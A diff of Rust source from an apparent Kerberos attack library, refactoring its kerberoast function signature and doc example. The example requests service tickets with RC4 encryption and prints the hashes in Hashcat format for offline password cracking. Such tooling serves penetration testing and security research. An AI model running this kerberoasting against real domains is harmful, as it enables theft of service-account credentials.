@@ -43,53 +43,46 @@ impl KerberoastService
 /// # Examples
 ///
 /// ```
-/// use cerbero_lib::{
-///     kerberoast, CrackFormat, CredFormat, EncryptionType, FileVault, KdcComm, Kdcs, Key, KrbUser, TransportProtocol,
-/// };
-/// use std::net::{IpAddr, Ipv4Addr};
+/// let mut kdcs = Kdcs::new();
+/// let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
+/// kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);
 ///
-/// fn main()
+/// let key = Key::Secret("Password".to_string());
+/// let kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);
+/// let mut vault = FileVault::new("tickets.ccache".to_string());
+///
+/// let services: Vec<String> = vec![
+///                                  "Username".to_string(),
+///                                  "DOMAIN/Username".to_string(),
+///                                  "Username:SPN".to_string(),
+///                                  "DOMAIN/Username:SPN".to_string()
+/// ];
+///
+/// match kerberoast(
+///                  "DOMAIN.COM",
+///                  "Username",
+///                  services,
+///                  &mut vault,
+///                  None,
+///                  Some(&key),
+///                  CredFormat::Ccache,
+///                  CrackFormat::Hashcat,
+///                  Some(EncryptionType::RC4),
+///                  kdccomm,
+/// )
 /// {
-///     let mut kdcs = Kdcs::new();
-///     let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
-///     kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);
-///
-///     let user = KrbUser::new("Username".to_string(), "DOMAIN.COM".to_string());
-///     let key = Key::Secret("Password".to_string());
-///     let kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);
-///     let mut vault = FileVault::new("tickets.ccache".to_string());
-///
-///     let services: Vec<String> = vec![
-///                                      "Username".to_string(),
-///                                      "DOMAIN/Username".to_string(),
-///                                      "Username:SPN".to_string(),
-///                                      "DOMAIN/Username:SPN".to_string()
-///     ];
-///
-///     match kerberoast(
-///                      user,
-///                      services,
-///                      &mut vault,
-///                      None,
-///                      Some(&key),
-///                      CredFormat::Ccache,
-///                      CrackFormat::Hashcat,
-///                      Some(EncryptionType::RC4),
-///                      kdccomm,
-///     )
+///     Ok(hashes) =>
 ///     {
-///         Ok(hashes) =>
+///         for hash in hashes.iter()
 ///         {
-///             for hash in hashes.iter()
-///             {
-///                 println!("Crackable hash: {}", hash);
-///             }
-///         },
-///         Err(e) => panic!("Failed to kerberoast user: {}", e),
-///     };
-/// }
+///             println!("Crackable hash: {}", hash);
+///         }
+///     },
+///     Err(e) => panic!("Failed to kerberoast user: {}", e),
+/// };
 /// ```
-pub fn kerberoast(user: KrbUser,
+pub fn kerberoast(realm: &str,
+                  username: &str,
                   user_services: Vec<String>,
                   in_vault: &mut dyn Vault,
                   out_vault: Option<&dyn Vault>,
@@ -100,9 +93,11 @@ pub fn kerberoast(user: KrbUser,
                   mut kdccomm: KdcComm)
                   -> Result<Vec<String>>
 {
-	let krbts_srvs = parse_kerberoast(user_services, &user.realm)?;
+	let user = KrbUser::new(username.to_string(), realm.to_string());
 
-	let channel = kdccomm.create_channel(&user.realm)?;
+	let krbts_srvs = parse_kerberoast(user_services, realm)?;
+
+	let channel = kdccomm.create_channel(realm)?;
 	let tgt = get_user_tgt(user.clone(), user_key, etype.as_ref().map(|e| e.as_constant()), in_vault, &*channel)?;
 
 	let mut tickets = in_vault.dump()?;
